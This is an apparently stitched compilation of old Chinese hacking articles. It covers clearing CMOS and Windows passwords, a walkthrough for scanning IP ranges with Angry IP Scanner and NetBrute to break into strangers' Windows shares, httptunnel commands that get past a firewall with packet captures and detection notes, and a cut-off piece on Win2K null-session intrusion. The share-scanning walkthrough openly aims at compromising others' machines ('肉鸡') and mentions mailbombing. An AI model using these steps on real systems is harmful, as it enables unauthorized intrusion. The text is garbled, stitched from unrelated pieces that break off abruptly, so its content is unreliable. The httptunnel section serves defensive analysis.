总之,98的安全性比2000好,因为98基本上没用 一般来说,入侵98是从139,要改自己的lmhosts文件来达到入侵的目的! 不过我劝新手不要沉迷在我讲的方法中,虽然你能从中的到很多肉鸡,但是绝对不要做简单重复的工作 当有了一定水平后要去玩linux,unix,不然水平不会提高. 我写这篇文章的目的是让大家学习,请不要破坏,若是因此引起的一切后果本人概不负责!! 
密码挡不住
　　我们每个人在使用计算机时都会用到各种各样的的密码。这些密码虽然给我们带来了安全,但是如果忘记了也会带来很大的麻烦。笔者写这篇文章的目的就在于减轻密码为我们所带来的的"麻烦"。
　　一、 开机密码
　　开机密码，也就是CMOS密码，根据用户设置的不同，开机密码一般分为两种不同情况，一种就是Setup密码（采用此方式时，系统可直接启动，而仅仅只在进入BIOS设置时要求输入密码）；另一种就是System密码（采用此方式时，无论是直接启动还是进行BIOS设置都要求输入密码，没有密码将一事无成）。对于用户设置的这两种密码，我们的破解方法是有所区别的。
　　1.Setup密码
　　如果计算机能正常引导，只是不能进入BIOS设置（即设置了Setup密码），那么我们在遗忘密码之后只需在DOS状态下启动DEBUG，然后输入如下命令即可手工清除密码：
_ o 70 16 
_ o 71 16 
_ q 
　　另外，不熟悉DEBUG的用户也可到http://www.newhua.com/down/Cmospwd.zip下载一个专门破解CMOS密码的工具软件Cmospwd。然后在DOS启动该程序，它就会将用户的CMOS密码显示出来（Cmospwd支持Acer、AMI、AWARD、COMPAQ、DELL、IBM、PACKARD BELL、PHOENIX、ZENITH AMI等多种BIOS），使用非常方便。
　　2.System密码
　　若没有密码根本不能启动计算机（即设置了System密码），那我们就无法通过软件来解决密码遗忘的问题了。此时惟一的方法就是打开机箱，给CMOS放电，清除CMOS中的所有内容（当然也就包括密码），然后重新开机进行设置。另外，有些主板设置了CMOS密码清除跳线，将该跳线短接也可达到同样的目的（详情参见主板说明书）。
二、Windows操作系统密码
　　1.Windows启动密码
　　遗忘Windows的启动密码虽然不会影响系统的启动，但它会导致用户无法进入自己的个人设置，因此破解Windows的启动密码以找回“丢失”的“个性”也是很有必要的。为此，我们可删除Windows安装目录下的*.PWL密码文件（或者把*.pwl改名）及Profiles子目录下的所有个人信息文件，然后重新启动Windows ，系统就会弹出一个不包含任何用户名的密码设置框，我们无需输入任何内容，直接点击“确定”按钮，Windows 密码即被删除。另外，运行“regedit.exe”，打开注册表数据库“HKEY_LOCAL_MACHINE”→“Network”→“Logon”分支下的“UserProfiles”修改为“0”，然后重新启动Windows 也可达到同样的目的。
　　2.电源管理密码
　　Windows的电源管理功能也可以设置密码，设置此功能后，系统在从节能状态返回时就会要求输入密码，从而在一定程度上实现保护系统的目的。不过由于电源管理功能的密码与Windows的启动密码完全一样，因此我们只要破解了Windows的启动密码，其电源管理密码也就不攻自破了。
　　从上面的介绍中可以看出，Windows的密码保护功能并不完善，无论是开机密码还是屏幕保护、电源管理密码都非常脆弱，我们必须辅之以其他控制措施才能达到防止他人入侵的目的。
　　3.IE浏览器分级审查的密码
　　有是我们忘记了我们设置的 windows 的IE 浏览器分级审查的密码，可以运行“regedit.exe”，打开注册表数据库把“HKEY_LOCAL_MACHINE”→“Software”→“Microsoft”→“Windows”→“CurrentVersion”→“Policies”→“Ratings” 下的 "key" 删除。
windows的入侵与攻略
第一段：
Ο行动之前我们推荐你现在文件夹选项中设置显示所有的文件夹与文件，这样可以将所有找到的文件夹与文件都显示出来，而不会有漏网之鱼。
▼入侵WINDOWS流程
㈠开始入侵操作
有关WINDOWS NETBIOS端口139的扫描工具很多，但在经过我们的精挑细选，严格考验之后，发现将ANGRY IP SCANNER与NETBRUTE SCANNER来搭配使用会有最快最加的效果，所以这里就以他们来进行操作说明，请依照下面的步骤来进行。
⑴已经有特定对象的IP地址或已有特定范围的IP地址。
⑵不是通过公司或单位的仿真IP连接到INTERNET。
⑶不是局域网中的其他电脑连接到INTERNET。
⑷不是通过某些硬件防火墙之后再连接到INTERNET。
完全符合以上情况者则可以直接跳到步骤④使用NETBRUTE SCANNER来进行，而不需要使用ANGRY IP SCANNER。
步骤①设置ANGRY IP SCANNER
首先要设置ANGRY IP SCANNER只要查找有效IP地址而且已经运行端口139的程序（就是运行WINDOWS系统的电脑啦！），再如下操作。
打开ANGRY IP SCANNER。
⑴点击OPTIONS，选第一项。
⑵选择ONLY ALIVE
⑶RESOLVE HOST NAMES和CHECK FOR OPEN PORT上划钩，点击确定。
再选择OPTIONS，保存。
步骤②开始查找
现在就可以输入要查的IP范围或输入某个特定IP地址来查找，如下
⑴打开后输入特定范围或单一地址。
⑵按下按钮。
完成后出现SCAN COMPLETE信息
⑴在PORT区域按两下
⑵所有端口139开启的电脑都集中在前面（绿色）
步骤③第一次入侵
若你所输入的特定IP地址没有显示出来，表示该电脑并不是运行WINDOWS系统，你必须改用下列的其他入侵，攻击或破坏方式。
⑴对该电脑进行瘫痪试攻击，可见以后的文章。
⑵针对对方的电子信箱进行轰炸攻击，让对方无法收信，可见以后的文章。
⑶截取对方的电子邮件来获取相关数据，可见以后的文章。
⑷发黑信给对方来恶作剧，可见以后的文章。
再要入侵的IP地址上按一下鼠标右键，选择IN EXPLORER。 
哈哈，个位成功了吗？由于此程序并不会自动找出共享的磁盘，所以只好一个个来TRY了，若无法进入就会出现如下信息。
NETBIOS IS NOT……
但是若你不通过公司或单位的仿真IP，局域网中的其他电脑，或通过某些硬件防火墙之后再连接到INTERNET，则可以再使用NETBRUTE SCANNER来帮你更快地找出可入侵的电脑，否则只能按照上述操作一个个试试看了。（接第2段）
步骤④使用NETBRUTE SCANNER
是一个非常棒的IP扫描与资源共享查找程序NETBRUTE SCANNER，他具有下列几项能力：
⑴查找目前正在INTERNET（或使用TCP/IP的局域网）上的有效IP地址。
⑵该IP地址电脑是否使用WINDOWS系统。
⑶该电脑是否将任何的磁盘（包括＄共享名的磁盘），光驱，打印机设置共享。
只要这三项条件都是YES，它就会将该电脑所有设置为共享的磁盘（包括＄共享名的磁盘），光驱，打印机设置共享，全部显示出来，实在节省个位黑客的不少时间，也是任何一位WINDOWS黑客不可缺少的好工具。OK！吹捧完毕。
㈠请先运行，点击OPTIONS，第一项的打钩取消。
㈡IP RANGE的查找范围可以大一些。
㈢若你或查找对象是电话拨号上网或查找国外IP地址则要设大一些，如800-2500。
http暗藏通道看网络安全
 通过本文的httptunnel 技术同时逃过了防火墙的屏蔽以及系统的追踪试验，我们可以看到网络安全仅仅依靠某种或某几种手段是不可靠的，同时对安全系统的盲目性依赖往往会造成巨大的安全隐患。希望通过本文能引起管理员对网络安全防护系统的思考。 
什么是http暗藏通道 什么是局域网安全，系统管理员怎样才能保障局域网的安全？这是一个不断变化的安全概念，很长的一个时期以来，在局域网与外界互联处放置一个防火墙，严格控制开放的端口，就能在很大程度上掌握安全的主动权，方便的控制网内外用户所能使用的服务。比如，在防火墙上仅仅开放80，53两个端口，那么无论是内部还是外面的恶意人士都将无法使用一些已经证明比较危险的服务。 
但要注意一点，防火墙在某种意义上是很愚蠢的，管理员对防火墙的过分依赖以及从而产生的懈怠情绪将不可避免的形成安全上的重大隐患，作为一个证明，"通道"技术就是一个很好的例子，这也是本文要讨论的。 
那么什么是通道呢？这里所谓的通道，是指一种绕过防火墙端口屏蔽的通讯方式。防火墙两端的数据包封装在防火墙所允许通过的数据包类型或是端口上，然后穿过防火墙与对端通讯，当封装的数据包到达目的地时，再将数据包还原，并将还原后的数据包交送到相应的服务上。举例如下： 
A主机系统在防火墙之后，受防火墙保护，防火墙配置的访问控制原则是只允许80端口的数据进出，B主机系统在防火墙之外，是开放的。现在假设需要从A系统Telnet到B系统上去，怎么办？使用正常的telnet肯定是不可能了，但我们知道可用的只有80端口，那么这个时候使用Httptunnel通道，就是一个好的办法，思路如下： 
在A机器上起一个tunnel的client端，让它侦听本机的一个不被使用的任意指定端口，如1234，同时将来自1234端口上的数据指引到远端（B机）的80端口上（注意，是80端口，防火墙允许通过），然后在B机上起一个server，同样挂接在80端口上，同时指引80端口的来自client的转发到本机的telnet服务端口23，这样就ok了。现在在A机上telnet本机端口1234，根据刚才的设置数据包会被转发到目标端口为80的B机，因为防火墙允许通过80端口的数据，因此数据包畅通的穿过防火墙，到达B机。此时B机在80端口侦听的进程收到来自A的数据包，会将数据包还原，再交还给telnet进程。当数据包需要由B到A返回时，将由80端口再回送，同样可以顺利的通过防火墙。 
实际上tunnel概念已经产生很久了，而且很有可能读者使用过类似的技术，比如下面的网址http://www.http-tunnel.com。它是一个专业提供tunnel服务的公司，通过他们的在线tunnel server,局域网内的用户可以使用被防火墙所屏蔽的ICQ，E-MAIL，pcanywhere， AIM，MSN， Yahoo，Morpheus，Napster等等诸多软件。我们看到，这里有ICQ,Napster等软件，相信我们的读者很多都使用过走proxy的ICQ,OICQ等等，其实他们的原理是差不多的。 
什么是Httptunnel 
作为一个实际的例子，我们下面来介绍一个在"非公开领域"使用的的通道软件，httptunnel。在httptunnel主页（请参阅参考资料）上有这么一端话， 
httptunnel creates a bidirectional virtual data connection tunnelled in HTTP requests. The HTTP requests can be sent via an HTTP proxy if so desired. 
This can be useful for users behind restrictive firewalls. If WWW access is allowed through a HTTP proxy, it‘‘s possible to use httptunnel and, say, telnet or PPP to connect to a computer outside the firewall. 
从这段说明中我们可以看出来它就是我们今天说要介绍的tunnel技术的一个证明，我们下面大致介绍一下它的使用。 
httptunnel目前比较稳定的版本是3.0.5, 支持各种常见的unix系统，包括window平台。可以从相关站点（请参阅参考资料）下载，它的安装是比较简单的，照INSTALL文件做就可以了，这里不介绍。 
整个软件安装完毕后，我们会得到两个关键文件，htc和hts,其中htc是客户端（c），而hts是server(s)端，我们来看看具体怎么使用的。 
假设有A（域名client.yiming.com)机，B(域名server.yiming.com)机，两机均为solaris环境，A机在防火墙保护中，B机在防火墙以外，防火墙的管理员控制了访问规则，仅ALLOW 80和53端口的进出数据包。而我们的任务是要利用Httptunnel从A机telnet到B机上，穿过防火墙的限制。操作如下： 
首先我们在A上启动client端，命令很简单： 
client.yiming.com#htc -F 1234 server.yiming.com:80， 
系统回到提示符下，此刻我们用netstat -an 可以看到系统内多出了1234端口的侦听 
*.1234 *.* 0 0 0 0 LISTEN 
然后我们在B机上启动server端，命令如下： 
server.yiming.com#hts -F localhost:23 80 
系统回到提示符下，此刻我们用netstat看 
*.80 *.* 0 0 0 0 LISTEN 
80端口处于侦听状态，需要注意的是，如果系统本身跑的有web服务（80端口本身处于侦听），并不会影响Httptunnel的工作。 
Ok,server以及client端都启动了，我们可以开始我们的"通道"试验了，在client.yiming.com上执行一下如下命令看看： 
Client.yiming.com#telnet localhost 1234 
Trying 0.0.0.0... 
Connected to 0. 
Escape character is ‘‘^]‘‘. 
SunOS 5.7 
This is yiming‘‘s private box! Any question,contact me with yiming@security.zz.ha.cn 
login: 
看到B机的登录提示符了,输入账号密码看看是否工作正常？ 
Login:yiming 
Password: (omit here;) ) 
sever.yiming.com# ls 
bak check go httpd lost+found mrtg run soft wg 
OK! 工作正常，和正常的telnet没有什么差别。 
仔细观察整个过程，会发现在最开始的地方显示的是Trying 0.0.0.0...，Connected to 0.而不是Trying server.yiming.com…,Connect to server.yiming.com，这就很直观的可以看出来client端是转发1234数据包到本机80端口的。（然后再转发到远端）而不是直接连接远端的B机。 
上面是比较直观的测试，为了进一步验证server和client之间不是通过23端口通讯，我们抓取数据包来看看。我们在server起个抓包工具tcpdump（请参阅参考资料）瞧瞧。 
server.yiming.com#tcpdump host client.yiming.com 
tcpdump: listening on hme0 
14:42:54.213699 client.yiming.com.51767 > server.yiming.com.80: S 1237977857:1237977857(0) win 8760 (DF) 
14:42:54.213767server.yiming.com.80 > client.yiming.com.51767: S 1607785698:1607785698(0) ack 1237977858 win 8760 (DF) 
14:42:54.216186 client.yiming.com.51768 > server.yiming.com.80: . ack 1 win 8760 (DF) 
14:42:54.218661 client.yiming.com.51768 > server.yiming.com.80: P 1:44(43) ack 1 win 8760 (DF) 
14:42:54.218728 client.yiming.com.51768 > server.yiming.com.80: P 44:48(4) ack 1 win 8760 (DF) 
篇幅所限，上面只是截取了结果中的一点点数据包，但已经可以说明问题了，我们看到server和client之间顺利的完成了三次握手，然后开始push数据，而且通讯确实走的是80端口。有点意思噢。 
看是看出来了，但太不直白，到底在搞什么呀，我们再稍微改动一下tcpdump的运行方式，进一步在来看看telnet的数据是否被封装在80端口的数据包内传输？ 
server.yiming.com#tcpdump -X host client.yiming.com 
14:43:05.246911 server.yiming.com.80 > client.yiming.com.51768: . 2997:4457(1460) ack 89 win 8760 (DF) 
0x0000 4500 05dc 3b23 4000 ff06 e2c2 yyyy yyyy E...;#@......f.D 
0x0010 xxxx xxxx 0050 de42 5fd5 ac4f 39ac 016f .f.#.P.B_..O9..o 
0x0020 5010 2238 98e4 0000 746f 7461 6c20 3636 P."8....total.66 
0x0030 370d 0a64 7277 7872 2d78 722d 7820 2032 7..drwxr-xr-x..2 
0x0040 3920 726f 6f74 2020 2020 2072 6f6f 7420 9.root.....root. 
呵呵，这次清楚多了，上面应该是一次ls命令的输出结果，可以清楚的看到telnet的结果！果然telnet的数据是在80端口的数据包内！ 
Httptunnel带来的安全问题 
写到这里，我们可以想象一下，如果管理员完全信赖防火墙，那么在一个有这样隐患的的局域网中，会发生什么样的后果？ 
我们可以看到，多年以来，对防火墙的依赖也一直列在SANS的Top 10安全问题中。 
既然如此，就很自然的会产生一个问题是：这种httptunnel行为能被发现吗？ 
首先我们想到的是使用入侵检测系统，在目前的网络安全设计中，防火墙加入侵检测系统是一种比较流行的安全联动配置，既然httptunnel绕过了防火墙，那么IDS系统呢？我们来测测看看。 
在下面的测试中，我们将使用IDS系统是Snort，版本1.8.2。（请参阅参考资料）这可是大名鼎鼎的开放源代码的IDS系统，在它的说明中，被描述为一个轻量级的，可跨平台工作的入侵检测系统，在2001年12月英国的独立测试实验室NSS的评测中（请参阅参考资料），击败了包括商用IDS系统的所有对手，这些商用软件可是包括ISS，CISCO SECURE IDS，CA ETRUST，CYBERSAFE CENTRAX，NFR。有兴趣的读者还可以看这篇名为Open source mounts IDS challenge 的报道（请参阅参考资料）。 
好，对Snort的大致介绍完毕，我们来看看结果吧，Snort对整个试验过程抓获的数据包产成了告警，如下： 
[**] WEB-MISC whisker splice attack [**] 
12/02-14:42:54.389175 client.yiming.com:51767-> server.yiming.com:80 
TCP TTL:251 TOS:0x0 ID:3327 IpLen:20 DgmLen:42 DF 
***AP*** Seq: 0x49CA0BA7 Ack: 0x5FD4DCE3 Win: 0x2238 TcpLen: 20 
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ 
[**] WEB-MISC whisker splice attack [**] 
12/02-14:43:03.195006 client.yiming.com:51767 -> server.yiming.com:80 
TCP TTL:251 TOS:0x0 ID:3439 IpLen:20 DgmLen:41 DF 
***AP*** Seq: 0x49CA0C20 Ack: 0x5FD4DCE3 Win: 0x2238 TcpLen: 20 
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ 
[**] WEB-MISC whisker splice attack [**] 
12/02-14:43:04.630268 client.yiming.com:51768-> server.yiming.com:80 
TCP TTL:251 TOS:0x0 ID:3496 IpLen:20 DgmLen:41 DF 
***AP*** Seq: 0x49CA0C4E Ack: 0x5FD4DCE3 Win: 0x2238 TcpLen: 20 
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ 
我们看到snort对抓获的数据包产生了WEB-MISC whisker splice attack的告警，然而这种攻击并没有发生，同时snort对tunnel数据包没有察觉。这样snort就同时出现了IDS系统的两个问题，false positive，false negative。 
这也很正常，因为这也是基于签名的IDS系统的通病，目前决大数IDS系统包括著名的商用软件ISS,NFR等都是基于签名的，也就是说系统维护着一套特定攻击数据包的数据模式签名。系统工作时，检查经过的数据包的内容，和自己数据库内数据模式签名对比，如果和某种攻击模式签名相同，那么就判断发生了某种攻击。 
由此我们可以看出很明显的存在若干问题：如对签名的依赖不可避免的导致两个结果，false negative ,false positive。也就是说会产生漏报和误报，这一点很容易理解，当新出现一种攻击模式时，由于IDS系统内没有相应的数据签名，那么就不可能捕获相应的攻击数据包，false negative由此发生。同时，过于依赖签名模式也很容易误报，就象我们上面的例子。同时，对数据签名的依赖会在一定程度上降低系统性能-经过的数据包都需要和IDS系统的签名对照。（请参阅参考资料） 
此外，基于签名的IDS系统本身有可能由于依据签名这一特性而被攻击，一个例子是stick ，这个程序的作者利用IDS系统进行签名匹配工作原理，发送大量带有攻击特征的数据包给IDS系统，使IDS系统本身处理能力超过极限，从而导致IDS系统无法响应。按照作者Coretez Giovanni的说法，运行2秒钟stick就能使著名的商用IDS系统ISS real secure崩溃。由上我们看到，对IDS系统的完全依赖同样是有风险的。（请参阅参考资料） 
一些解决思路 
看来依靠手头的IDS是无法察觉这种行为了，那么有其它办法吗？我们仔细分析一下事件过程中截获的httptunnel数据包再说吧。 
仔细观察截获的httptunnel数据包，可以发现紧跟着三次握手完成后的第一个数据包包含着一个POST动作，是由htc（client端）发送到hts(server端)的。如下： 14:55:39.128908 client.yiming.com.51767 > server.yiming.com.80: S 3521931836:3521931836(0) win 8760 (DF) 
0x0000 4500 002c d3cc 4000 fb06 53c9 xxxx xxxx E..,..@...S..f.# 
0x0010 yyyy yyyy ca37 0050 d1ec 6a3c 0000 0000 .f.D.7.P..j<.... 
0x0020 6002 2238 1708 0000 0204 05b4 0000 `."8.......... 
14:55:39.128945 server.yiming.com.80 > client.yiming.com.51767: S 2946004964:2946004964(0) ack 3521931837 win 8760 (DF) 
0x0000 4500 002c cb85 4000 ff06 5810 yyyy yyyy E..,..@...X..f.D 
0x0010 xxxx xxxx 0050 ca37 af98 77e4 d1ec 6a3d .f.#.P.7..w...j= 
0x0020 6012 2238 ef79 0000 0204 05b4 `."8.y...... 
14:55:39.131002 client.yiming.com.51767 > server.yiming.com.80: . ack 1 win 8760 (DF) 
0x0000 4500 0028 d3cd 4000 fb06 53cc xxxx xxxx E..(..@...S..f.# 
0x0010 yyyy yyyy ca37 0050 d1ec 6a3d af98 77e5 .f.D.7.P..j=..w. 
0x0020 5010 2238 0737 0000 0000 0000 0000 P."8.7........ 
14:55:39.132841 server.yiming.com.80 > client.yiming.com.51767: . ack 44 win 8760 (DF) 
0x0000 4500 0028 cb86 4000 ff06 5813 yyyy yyyy E..(..@...X..f.D 
0x0010 xxxx xxxx 0050 ca37 af98 77e5 d1ec 6a68 .f.#.P.7..w...jh 
0x0020 5010 2238 070c 0000 P."8.... 
14:55:39.132860 client.yiming.com.51767 > server.yiming.com.80: P 1:44(43) ack 1 win 8760 (DF) 
0x0000 4500 0053 d3ce 4000 fb06 53a0 xxxx xxxx E..S..@...S..f.# 
0x0010 yyyy yyyy ca37 0050 d1ec 6a3d af98 77e5 .f.D.7.P..j=..w. 
0x0020 5018 2238 d23a 0000 504f 5354 202f 696e P."8.:..POST./in 
0x0030 6465 782e 6874 6d6c 3f63 7261 703d 3130 dex.html?crap=10 
0x0040 3037 3838 3034 3836 2048 5454 502f 312e 07880486.HTTP/1. 
0x0050 310d 0a 1.. 
1.. 
看起来是发送client端的数据包到server端的，那么server有什么反应呢？我们往下看,在上面这个过程完成后，htc和hts又发生了一次握手（注意，又一次握手），如下： 
14:55:39.134301 client.yiming.com.51768 > server.yiming.com.80: S 2851199448:2851199448(0) win 8760 (DF) 
0x0000 4500 002c d3df 4000 fb06 53b6 xxxx xxxx E..,..@...S..f.# 
0x0010 yyyy yyyy ca38 0050 a9f1 d9d8 0000 0000 .f.D.8.P........ 
0x0020 6002 2238 cf65 0000 0204 05b4 0000 `."8.e........ 
14:55:39.134389 server.yiming.com.80 > client.yiming.com.51768: S 2946060449:2946060449(0) ack 2851199449 win 8760 (DF) 
0x0000 4500 002c cb8f 4000 ff06 5806 yyyy yyyy E..,..@...X..f.D 
0x0010 xxxx xxxx 0050 ca38 af99 50a1 a9f1 d9d9 .f.#.P.8..P..... 
0x0020 6012 2238 cf19 0000 0204 05b4 `."8........ 
14:55:39.136527 client.yiming.com.51768 > server.yiming.com.80: . ack 1 win 8760 (DF) 
0x0000 4500 0028 d3e0 4000 fb06 53b9 xxxx xxxx E..(..@...S..f.# 
0x0010 yyyy yyyy ca38 0050 a9f1 d9d9 af99 50a2 .f.D.8.P......P. 
0x0020 5010 2238 e6d6 0000 0000 0000 0000 P."8.......... 
14:55:39.137333 client.yiming.com.51768 > server.yiming.com.80: P 1:43(42) ack 1 win 8760 (DF) 
0x0000 4500 0052 d3e1 4000 fb06 538e xxxx xxxx E..R..@...S..f.# 
0x0010 yyyy yyyy ca38 0050 a9f1 d9d9 af99 50a2 .f.D.8.P......P. 
0x0020 5018 2238 25ce 0000 4745 5420 2f69 6e64 P."8%...GET./ind 
0x0030 6578 2e68 746d 6c3f 6372 6170 3d31 3030 ex.html?crap=100 
0x0040 3738 3830 3438 3620 4854 5450 2f31 2e31 7880486.HTTP/1.1 
0x0050 0d0a .. 
14:55:39.137379 server.yiming.com.80 > client.yiming.com.51768: . ack 43 win 8718 (DF) 
0x0000 4500 0028 cb90 4000 ff06 5809 yyyy yyyy E..(..@...X..f.D 
0x0010 xxxx xxxx 0050 ca38 af99 50a2 a9f1 da03 .f.#.P.8..P..... 
0x0020 5010 220e e6d6 0000 P."..... 
14:55:39.139733 client.yiming.com.51768 > server.yiming.com.80: P 43:89(46) ack 1 win 8760 (DF) 
0x0000 4500 0056 d3e2 4000 fb06 5389 xxxx xxxx E..V..@...S..f.# 
0x0010 yyyy yyyy ca38 0050 a9f1 da03 af99 50a2 .f.D.8.P......P. 
0x0020 5018 2238 e156 0000 486f 7374 3a20 3230 P."8.V..Host:.20 
0x0030 322e 3130 322e 3232 372e 3638 3a38 300d 2.102.227.68:80. 
0x0040 0a43 6f6e 6e65 6374 696f 6e3a 2063 6c6f .Connection:.clo 
0x0050 7365 0d0a 0d0a se.... 
14:55:39.151300 server.yiming.com.80 > client.yiming.com.51768: P 1:170(169) ack 89 win 8760 (DF) 
0x0000 4500 00d1 cb91 4000 ff06 575f yyyy yyyy E.....@...W_.f.D 
0x0010 xxxx xxxx 0050 ca38 af99 50a2 a9f1 da31 .f.#.P.8..P....1 
0x0020 5018 2238 e721 0000 4854 5450 2f31 2e31 P."8.!..HTTP/1.1 
0x0030 2032 3030 204f 4b0d 0a43 6f6e 7465 6e74 .200.OK..Content 
0x0040 2d4c 656e 6774 683a 2031 3032 3430 300d -Length:.102400. 
0x0050 0a43 6f6e 6e65 6374 696f 6e3a 2063 6c6f .Connection:.clo 
0x0060 7365 0d0a 5072 6167 6d61 3a20 6e6f 2d63 se..Pragma:.no-c 
0x0070 6163 6865 0d0a 4361 6368 652d 436f 6e74 ache..Cache-Cont 
0x0080 726f 6c3a 206e 6f2d 6361 6368 652c 206e rol:.no-cache,.n 
0x0090 6f2d 7374 6f72 652c 206d 7573 742d 7265 o-store,.must-re 
0x00a0 7661 6c69 6461 7465 0d0a 4578 7069 7265 validate..Expire 
0x00b0 733a 2030 0d0a 436f 6e74 656e 742d 5479 s:.0..Content-Ty 
0x00c0 7065 3a20 7465 7874 2f68 746d 6c0d 0a0d pe:.text/html... 
从数据包中可以看到，本次通讯中hts(server)端向htc(client)端发送了一个GET的标识包，估计是去"取"刚才client端发来的数据包，而且是一次新的握手！为了验证，我们分别在client,server端，执行netstat -an，结果证明了我们的观察是正确的，如下： 
client.yiming.com.51767 server.yiming.com.80 8760 0 8760 0 ESTABLISHED 
client.yiming.com.51768 server.yiming.com.80 8760 0 8760 0 ESTABLISHED 
在server端，执行netstat -an，结果如下： 
server.yiming.com.80 client.yiming.com.51767 8760 0 8760 0 ESTABLISHED 
server.yiming.com.80 client.yiming.com.51768 8760 0 8760 0 ESTABLISHED 
果然，防火墙两边的系统都起了两个socket，和一般程序不同，这是个比较特殊的现象。 
GET动作完成后，server端又向client端发送了一个数据包，内容是 
HTTP/1.1 200 OK Content-Length: 102400 
Connection: close 
Pragma: no-cache 
Cache-Control: no-cache, no-store, must-revalidate 
Expires: 0 
Content-Type: text/html 
这里应该是定义数据包传输最大值等参数的。 
作者察觉，经由了这三次htc和hts之间的作用后，httptunnel才真正的建立起来，后面的工作才能正常开展，而且很有意思的是，自此以后所有后续的数据包一律没有80端口经常走的GET,PUT,POST之类的内容！！这里看来可以想点办法。 
上面说过，正常走80端口的数据包应该是web行为，那么就数据包中就应该少不了get等正常的动作内容，如果在80端口经过的数据总是没有这些东东，那么就肯定有问题了， 
那么这种问题就有了一种解决方案，就是手工检查通过80端口通过的数据包，如果数据包是明文传送，那么就很容易发现这种行为。但这种行为也只能在理论上可行。在实际上的操作是不可能的，有没有比较成熟的这种产品呢？按照这个思路检索网上的数据，果然发现有种入侵检测e-Gap系统可以确实察觉及屏蔽httptunnel等通道软件的存在，它工作在tcp/ip的应用层，在应用层一级检测数据包的确切性，比如，检测80端口的数据包，如果看起来数据包中总是没有有效的数据（URL,get,put等参数），那么e-Gap系统就会报警，并中断连接行为。（请参阅参考资料） 
需要注意的是，这种侦测方法仅对明文传送的有效，如果数据被加密，那么也就无计可施了。那么再进一步，如果加密了呢？目前作者掌握的情况来看，StealthWatch硬件产品可能是一种比较好的选择，它完全摈弃了基于签名的工作模式，而是采用一种正在申请专利的基于flow-base构架策略，按照几家评测实验室的结果来看，可以有效的察觉已经公开和未公开的各种攻击，Dos，蠕虫，病毒等，甚至包括加密的通讯！但是，它的价钱也远远的超出了普通的商用IDS系统，一套齐备的设施需4万美元！具体效果作者目前没有条件测试。（请参阅参考资料） 
总结 
在我们的试验中，httptunnel同时逃过了防火墙的屏蔽以及入侵检测系统的追踪，这是值得思考的。我们可以看到，网络安全仅仅依靠某种或某几种手段是不可靠的，尤其是对安全性要求很高的应用系统，同时对安全系统的盲目依赖往往会造成巨大的安全隐患。 
利用Win2K下的空会话（null session）入侵服务器
i、 introduction
ii、 about tcp port 445
iii、the null session
iv、 break through "restricanonymous=1"
v、 conclusion
终于有时间可以写自己的东西了。呵呵，直入主题，不废话了。
i、 introduction
关于win2k下面的空会话，已经是一个很老的话题了。当然，也一直被认为是win2
k自带的一个后门。当建立一个空会话之后，对于一台配置不到位的win2k服务器来说，
那么将能够得到非常多的信息，比如枚举帐号等等。
ii、 about tcp port 445, win2000的tcp 445端口
smb（server message block）协议在nt/2000中用来作文件共享，在nt中，smb运行
于nbt（netbios over tcp/ip）上，使用137，139（udp），139（tcp）端口。在2000中
，smb可以直接运行在tcp/ip上，而没有额外的nbt层，使用tcp 445端口。因此在2000上
应该比nt稍微变化多一些。
可以在“网络连接/属性/tcpip协议/属性/高级/wins中设置启用或者禁用nbt（net
bios over tcp/ip）。
当2000使用网络共享的时候，就面临着选择139或者445端口了。下面的情况确定会
话使用的端口：
1、如果客户端启用了nbt，那么连接的时候将同时访问139和445端口，如果从445端口得
到回应，那么客户端将发送rst到139端口，终止这个端口的连接，接着就从445端口进行
smb的会话了；如果没有从445端口而是从139得到回应，那么
就从139端口进行会话；如果没有得到任何回应，那么smb会话失败。
2、如果客户端禁用了nbt，他就将只从445端口进行连接。当然如果服务器（开共享端）
没有445端口进行smb会话的话，那么就会访问失败了，所以禁用445端口后，对访问nt机
器的共享会失败。
3、如果服务器端启用nbt，那么就同时监听udp 137、138端口和tcp139，445。如果禁用
nbt，那么就只监听445端口了。
所以对于2000来说，共享问题就不仅仅是139端口，445端口同样能够完成。
iii、the null session,关于空会话
null会话（空会话）使用端口也同样遵循上面的规则。null会话是同服务器建立的
无信任支持的会话。一个会话包含用户的认证信息，而null会话是没有用户的认证信息
，也就好比是一个匿名的一样。
没有认证就不可能为系统建立安全通道，而建立安全通道也是双重的，第一，就是
建立身份标志，第二就是建立一个临时会话密匙，双方才能用这个会话进行加密数据交
换（比如rpc和com的认证等级是pkt_privacy）。不管是经过ntlm还是经过kerberos认证
的票据，终究是为会话创建一个包含用户信息的令牌。（这段来自joe finamore）
根据win2000的访问控制模型，对于空会话同样需要提供一个令牌。但是空会话由于
是没有经过认证的会话，所以令牌中不包含用户信息，因此，建立会话双方没有密匙的
交换，这也不能让系统间发送加密信息。这并不表示空会话的令牌中不包含sid，对于一
个空会话，lsa提供的令牌的sid是s-1-5-7，这就是空会话建立的sid，用户名是 anony
mous logon。这个用户名是可以在用户列表中看到的。但是是不能在sam数据库中找到，
属于系统内置的帐号。
（关于这部分对null session的分析，可以参照：《null sessions in nt/2000》http
://rr.sans.org/win/null.php）
null会话几乎成为了微软自己安置的后门，但是微软为什么要来设置这样一个“后
门”呢？我也一直在想这个问题，如果null会话没有什么重要的用途，那么微软也应该
不会来设置这样一个东西。好不容易才在微软上找到这个：
当在多域环境中，要在多域中建立信任关系，首先需要找到域中的pdc来通过安全通
道的密码验证,使用空会话能够非常容易地找到pdc，还有就是关于一些系统服务的问题
。而且lmhosts的#include就需要空会话的支持，可以参考文章：
http://support.microsoft.com/default.aspx?scid=kben-us;q121281
还有http://support.microsoft.com/default.aspx?scid=kben-us;q124184
其实建立一个空会话的条件也非常严格。首先要能够满足上面的，也就是打开tcp 
139和tcp 445端口。我们可以从一次关闭这两个端口的情况中看得出来。服务器关闭44
5和139端口，然后我们来进行空会话的连接。首先，客户端打算
连接的是445端口，然后再试图连接139端口。当然最后还是失败了。
仅仅开放这两个端口还不行，服务器还必须得打开ipc$共享。如果没有ipc共享，即
使共享一个文件，有权限为anonymous logon，也不能建立会话，即使权限设置为完全控
制，出现的连接错误依然是权限不够。这和其他帐号是不一样的。如果要允许一个文件
夹共享能够类似ipc$（命名管道而非共享）能够使用空会话，那么需要修改注册表：
